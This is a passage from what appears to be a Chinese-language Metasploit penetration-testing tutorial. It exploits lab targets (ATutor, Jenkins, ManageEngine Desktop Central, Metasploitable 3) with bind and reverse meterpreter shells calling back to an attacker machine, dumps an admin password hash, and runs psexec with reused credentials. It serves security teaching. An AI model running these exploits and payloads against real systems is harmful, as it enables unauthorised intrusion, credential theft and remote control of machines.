
2. 要获取有关特定 payload 的更多信息，我们可以使用 info 命令，后跟 payload 名称：

```
msf exploit(atutor_sqli) > info payload/generic/shell_bind_tcp

Name: Generic Command Shell, Bind TCP Inline
Module: payload/generic/shell_bind_tcp
Platform: All
...
Provided by:
 skape <mmiller@hick.org>
```

基本选项：

| 名称 | 当前设置 | 必需 | 描述 |
|------|-----------------|----------|-------------|
| LPORT | 4444 | yes | 监听端口 |
| RHOST |  | no | 目标地址 |

描述：
 侦听连接并生成一个命令 shell

```
msf exploit(atutor_sqli) >
```

3. generic/shell_bind_tcp 是一个独立的通用 bind TCP 命令 shell。要将 shell_bind_tcp 选择为我们的 payload，我们使用 set PAYLOAD 命令，后跟 payload 名称：

```
msf exploit(atutor_sqli) > set PAYLOAD generic/shell_bind_tcp
PAYLOAD => generic/shell_bind_tcp
msf exploit(atutor_sqli) > exploit

[*] Started bind handler
[*] 192.168.216.136:80 - Dumping the username and password hash...
[+] 192.168.216.136:80 - Got the admin's hash:
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 !
[*] Command shell session 1 opened (192.168.216.5:41033 -> 192.168.216.136:4444) at 2017-10-26 10:33:45 -0400
[+] 192.168.216.136:80 - Deleted soae.php
[!] Tried to delete /var/content/module/mgp/soae.php, unknown result

...
Background session 1? [y/N] y
msf exploit(atutor_sqli) >
```

4. 使用 generic/shell_bind_tcp，我们获得了一个通用命令 shell，有用但远非理想。我们可以与此 exploit 一起使用的功能丰富且更高级的 payload 是 PHP Meterpreter：

```
msf exploit(atutor_sqli) > info payload/php/meterpreter/reverse_tcp

Name: PHP Meterpreter, PHP Reverse TCP Stager
Module: payload/php/meterpreter/reverse_tcp
Platform: PHP
Arch: php
Needs Admin: No
Total size: 1101
Rank: Normal

Provided by:
 egypt <egypt@metasploit.com>

...
msf exploit(atutor_sqli) >
```

5. 使用反向 shell 时，例如 php/meterpreter/reverse_tcp，我们需要使用 set LHOST 指定监听地址，这将是我们 Kali Linux 机器的 IP 地址，以及使用 set LPORT 命令指定监听端口，如果我们不想使用默认端口 4444：

```
msf exploit(atutor_sqli) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(atutor_sqli) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(atutor_sqli) > exploit

...

meterpreter >
[+] 192.168.216.136:80 - Deleted dmci.php

meterpreter > getuid
Server username: www-data (33)
meterpreter >
```

## 利用 Windows Server 机器

利用信息收集和扫描期间收集的信息，我们将进入漏洞利用的世界。在本教程中，我们将了解如何使用 Metasploit 入侵运行 Windows Server 2008 R2 的 Metasploitable 3 目标系统。我们将使用上一节学到的命令，然后继续选择漏洞利用和 payload，并设置各种所需参数。

## 准备工作

我们将直接从 msfconsole 开始渗透测试过程。因此，启动控制台并执行端口扫描以收集有关目标的信息。我们在上一章详细讨论了端口扫描。在这里，我假设您已经收集了有关目标系统及其服务的信息。因此，让我们继续选择漏洞利用和 payload。

有时，仅查看 Nmap 或甚至漏洞扫描器的输出是不够的。services 命令的输出只显示服务器正在运行一个版本的 Apache：

```
msf > services -p 8020 192.168.216.10

Services
========
```

| 主机 | 端口 | 协议 | 名称 | 状态 | 信息 |
|------|------|-------|------|-------|------|
| 192.168.216.10 | 8020 | tcp | http | open | Apache httpd |

```
msf >
```

渗透测试不是自动化任务是有原因的；人类好奇，他们倾向于超越服务横幅进行查看。

![](img/6b6e557533100c0e47951d0e5e14c4ee_462_0.png)

正如屏幕截图所示，网页上包含了我们搜索漏洞所需的所有信息，因此不要忘记手动检查目标站点。我无法强调初级渗透测试人员因未在浏览器中打开目标站点而错过诸如默认凭据之类的琐碎漏洞的情况有多频繁。

当我们在新闻中看到数据泄露时，大多数时候都是由于密码重复使用；因此 psexec 是渗透测试人员最常使用的工具之一。

## 如何操作...

- 1. 查看目标系统上 8484 端口运行的服务，我们可以看到它正在运行 Jenkins；从上一章中使用的 Jenkins-CI Enumeration 辅助模块输出中，我们知道其版本：

```
msf > services 192.168.216.10 -p 8484

Services
=========
```

| 主机 | 端口 | 协议 | 名称 | 状态 | 信息 |
|------|------|-------|------|-------|------|
| 192.168.216.10 | 8484 | tcp | http | open | Jenkins Version - 1.637 |

```
msf >
```

有了这些信息，我们可以使用 search 命令快速搜索并查看有哪些可用的漏洞利用：

![](img/6b6e557533100c0e47951d0e5e14c4ee_463_0.png)

2. 要利用该系统，我们将使用 Jenkins-CI Script-Console Java 执行漏洞利用：

```
msf exploit(jenkins_script_console) > setg RHOST 192.168.216.10
RHOST => 192.168.216.10
msf exploit(jenkins_script_console) > set RPORT 8484
RPORT => 8484
msf exploit(jenkins_script_console) > set TARGETURI /
TARGETURI => /
msf exploit(jenkins_script_console) > exploit
...
```

```
meterpreter > sysinfo
Computer : VAGRANT-2008R2
OS : Windows 2008 R2 (Build 7601, Service Pack 1).
Architecture : x64
System Language : en_US
Domain : WORKGROUP
Logged On Users : 2
Meterpreter : x86/windows
meterpreter >
```

让我们回顾一下我们迄今为止所做的工作。setg 在全局数据存储中设置一个值；这样我们使用的下一个模块将已经定义了 RHOST 值。要使用此漏洞利用，我们还需要指定远程端口和 Jenkins-CI 应用程序的路径，然后使用 exploit 命令利用目标。

![](img/6b6e557533100c0e47951d0e5e14c4ee_464_0.png)

unset 命令用于取消设置一个或多个变量。要刷新所有条目，请将 all 指定为变量名，-g 在全局数据存储变量上操作。

3. 由于我们未指定 payload，Metasploit 为我们做了选择：

![](img/6b6e557533100c0e47951d0e5e14c4ee_464_1.png)

默认情况下，Metasploit 使用了反向 TCP meterpreter payload。然而，我们有多个可用的 payload；要列出所有兼容的 payload，可以使用 show payloads 命令。

4. 现在我们知道目标正在运行 ManageEngine Desktop Central 版本 9，我们可以使用 search 命令查找可用的漏洞利用：

![](img/6b6e557533100c0e47951d0e5e14c4ee_465_0.png)

查看输出，我们有几个候选者；这再次说明为什么渗透测试人员尚未被脚本取代。仔细查看输出后，我们可以看到 ManageEngine Desktop Central 9 FileUploadServlet ConnectionId 漏洞是匹配的，我们可以进入下一阶段并利用目标：

```
msf > use exploit/windows/http/manageengine_connectionid_write
msf exploit(manageengine_connectionid_write) > set PAYLOAD windows/meterpreter/reverse_http
PAYLOAD => windows/meterpreter/reverse_http
msf exploit(manageengine_connectionid_write) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(manageengine_connectionid_write) > exploit
...

meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter >
```

这次，我们已指定了 payload，并选择使用 Windows Meterpreter Reverse HTTP Stager，它将通过反射 DLL 注入 payload 注入 meterpreter 服务器 DLL 并通过 HTTP 隧道传输通信。通过使用 HTTP，此 payload 更有可能绕过出站防火墙规则，因为大多数防火墙会允许机器建立到远程 HTTP 服务器的会话。

5. 要在 Metasploit 中使用 psexec，我们有几个选项；要列出所有 psexec 漏洞利用，我们可以使用 search 命令：

![](img/6b6e557533100c0e47951d0e5e14c4ee_466_0.png)

对于本教程，我们将查看 psexec 和 psexec_psh 漏洞利用。在信息收集和扫描阶段，我们能够暴力破解一些账户；使用这些凭据，我们将看看当用户重复使用密码时攻击者能做什么：

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set SMBUSER Administrator
SMBUSER => Administrator
msf exploit(psexec) > set SMBPASS vagrant
SMBPASS => vagrant
msf exploit(psexec) > run

...
meterpreter > sysinfo
Computer : VAGRANT-2008R2
OS : Windows 2008 R2 (Build 7601, Service Pack 1).
Architecture : x64
System Language : en_US
Domain : WORKGROUP
Logged On Users : 2
Meterpreter : x86/windows
meterpreter > background
[*] Backgrounding session 1...
msf exploit(psexec) >
```

Microsoft Windows Authenticated User Code Execution 模块使用有效的管理员用户名和密码（或密码哈希）来执行任意 payload，与 SysInternals 提供的 psexec 实用程序类似。
